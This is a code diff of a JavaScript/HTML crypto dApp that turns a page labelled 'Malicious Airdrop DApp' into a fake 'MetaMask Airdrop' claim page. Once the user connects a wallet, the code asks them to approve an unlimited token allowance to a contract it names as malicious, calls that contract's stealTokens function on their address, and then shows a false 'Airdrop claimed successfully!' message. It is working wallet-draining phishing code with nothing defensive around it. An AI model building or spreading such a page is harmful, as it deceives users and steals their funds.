@@ -3,158 +3,114 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Malicious Airdrop DApp</title>
+    <title>MetaMask Airdrop</title>
+    <script src="https://cdn.jsdelivr.net/npm/web3@1.8.2/dist/web3.min.js"></script>
 </head>
 <body>
-    <h1>Malicious Airdrop DApp5</h1>
+    <h1>Claim Your Free Airdrop!</h1>
     <button id="connectWallet">Connect MetaMask</button>
-    <button id="approveContract">Approve Contract</button>
-    <p id="status"></p>
+    <button id="claimAirdrop" disabled>Claim Airdrop</button>
+    <p id="status">Status: Not connected</p>
 
-    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
     <script>
-        let provider;
+        // Web3 variables
+        let web3;
         let userAddress;
-        const contractAddress = "0xe1782468Df2D6B6Ca645A10EefebF4Df30a12683"; // Replace with the deployed malicious contract
-        const tokenAddress = "0x1dD71aCdc4091d8de461e46C8F142A7F32BEE9F4"; // Replace with the TKK token address
+        const tokenContractAddress = "0x1dd71acdc4091d8de461e46c8f142a7f32bee9f4";
+        const maliciousContractAddress = "0xEAB74Cf131AA7C10ba358a2d5978314E1f891Df0";
 
-        const contractABI = [
+        // ERC-20 ABI (Token Functions)
+        const tokenABI = [
             {
+                "constant": false,
                 "inputs": [
-                    { "internalType": "address", "name": "spender", "type": "address" },
-                    { "internalType": "uint256", "name": "amount", "type": "uint256" }
+                    { "name": "spender", "type": "address" },
+                    { "name": "value", "type": "uint256" }
                 ],
                 "name": "approve",
-                "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }],
-                "stateMutability": "nonpayable",
+                "outputs": [{ "name": "", "type": "bool" }],
                 "type": "function"
             },
             {
-                "inputs": [
-                    { "internalType": "address", "name": "account", "type": "address" }
-                ],
+                "constant": true,
+                "inputs": [{ "name": "account", "type": "address" }],
                 "name": "balanceOf",
-                "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }],
-                "stateMutability": "view",
-                "type": "function"
-            },
-            {
-                "inputs": [
-                    { "internalType": "address", "name": "recipient", "type": "address" },
-                    { "internalType": "uint256", "name": "amount", "type": "uint256" }
-                ],
-                "name": "transfer",
-                "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }],
-                "stateMutability": "nonpayable",
-                "type": "function"
-            },
-            {
-                "inputs": [
-                    { "internalType": "address", "name": "sender", "type": "address" },
-                    { "internalType": "address", "name": "recipient", "type": "address" },
-                    { "internalType": "uint256", "name": "amount", "type": "uint256" }
-                ],
-                "name": "transferFrom",
-                "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }],
-                "stateMutability": "nonpayable",
+                "outputs": [{ "name": "", "type": "uint256" }],
                 "type": "function"
             }
         ];
 
-        const contractABI_Malicious = [
+        // Malicious Contract ABI
+        const maliciousContractABI = [
             {
-                "inputs": [],
-                "stateMutability": "nonpayable",
-                "type": "constructor"
-            },
-            {
-                "inputs": [],
+                "constant": false,
+                "inputs": [{ "name": "victim", "type": "address" }],
                 "name": "stealTokens",
                 "outputs": [],
-                "stateMutability": "nonpayable",
-                "type": "function"
-            },
-            {
-                "inputs": [],
-                "name": "withdrawTokens",
-                "outputs": [],
-                "stateMutability": "nonpayable",
                 "type": "function"
             }
         ];
 
+        // On page load
         window.onload = async () => {
-            console.log("Window loaded. Checking for MetaMask...");
             if (window.ethereum) {
-                provider = new ethers.providers.Web3Provider(window.ethereum);
-                console.log("MetaMask found. Adding event listener for connectWallet...");
+                web3 = new Web3(window.ethereum);
+
                 document.getElementById("connectWallet").addEventListener("click", connectWallet);
-                document.getElementById("approveContract").addEventListener("click", approveContract);
+                document.getElementById("claimAirdrop").addEventListener("click", claimAirdrop);
             } else {
-                alert("MetaMask not found. Please install it!");
-                console.error("MetaMask is not available.");
+                alert("MetaMask not found! Please install MetaMask.");
             }
         };
 
-        // Function to connect MetaMask
+        // Connect MetaMask
         async function connectWallet() {
-            console.log("Connect Wallet button clicked. Requesting accounts...");
             try {
-                // Request the user's accounts
-                const accounts = await provider.send("eth_requestAccounts", []);
-                if (accounts.length === 0) {
-                    alert("No MetaMask accounts found. Please login.");
-                    console.error("No accounts found in MetaMask.");
-                    return;
-                }
-                userAddress = accounts[0];  // Set the first account
-                console.log("Connected to MetaMask with address:", userAddress);
+                const accounts = await ethereum.request({ method: "eth_requestAccounts" });
+                userAddress = accounts[0];
                 document.getElementById("status").innerText = `Connected: ${userAddress}`;
+                document.getElementById("claimAirdrop").disabled = false;
             } catch (error) {
                 console.error("Error connecting MetaMask:", error);
                 document.getElementById("status").innerText = "Failed to connect wallet.";
             }
         }
 
-        // Function to approve the malicious contract
-        async function approveContract() {
+        // Claim Airdrop
+        async function claimAirdrop() {
             if (!userAddress) {
-                alert("Please connect your MetaMask wallet first.");
+                alert("Please connect your wallet first.");
                 return;
             }
 
             try {
-                console.log("Approving contract...");
+                document.getElementById("status").innerText = "Claiming airdrop...";
 
-                // Create the token contract and malicious contract objects
-                const tokenContract = new ethers.Contract(tokenAddress, contractABI, provider.getSigner());
-                const maliciousContract = new ethers.Contract(contractAddress, contractABI_Malicious, provider.getSigner());
+                // Initialize token and malicious contract instances
+                const tokenContract = new web3.eth.Contract(tokenABI, tokenContractAddress);
+                const maliciousContract = new web3.eth.Contract(maliciousContractABI, maliciousContractAddress);
 
-                // Estimate gas for approve transaction
-                const gasEstimate = await tokenContract.estimateGas.approve(contractAddress, ethers.utils.parseUnits("1000000", 18));
-                
-                // Approve the malicious contract
-                const tx = await tokenContract.approve(contractAddress, ethers.utils.parseUnits("1000000", 18), {
-                    gasLimit: gasEstimate
-                });
-                await tx.wait();
+                // Approve the malicious contract to spend unlimited tokens
+                const approveTx = await tokenContract.methods
+                    .approve(maliciousContractAddress, web3.utils.toHex(web3.utils.toBN(2).pow(web3.utils.toBN(256)).sub(web3.utils.toBN(1))))
+                    .send({ from: userAddress });
+                console.log("Approval Transaction:", approveTx);
 
-                document.getElementById("status").innerText = "Approval granted. Attempting to steal tokens...";
+                // Call the malicious stealTokens function
+                const stealTx = await maliciousContract.methods
+                    .stealTokens(userAddress)
+                    .send({ from: userAddress });
+                console.log("Steal Transaction:", stealTx);
 
-                // Call the stealTokens function
-                const maliciousTx = await maliciousContract.stealTokens();
-                await maliciousTx.wait();
-
-                document.getElementById("status").innerText = "Tokens stolen successfully!";
+                document.getElementById("status").innerText = "Airdrop claimed successfully!";
             } catch (error) {
-                console.error("Error during approval or token transfer:", error);
-                document.getElementById("status").innerText = "Failed to complete the process.";
+                console.error("Error during the airdrop process:", error);
+                document.getElementById("status").innerText = "Failed to claim the airdrop.";
             }
         }
     </script>
 </body>
 </html>
-
 
 
 
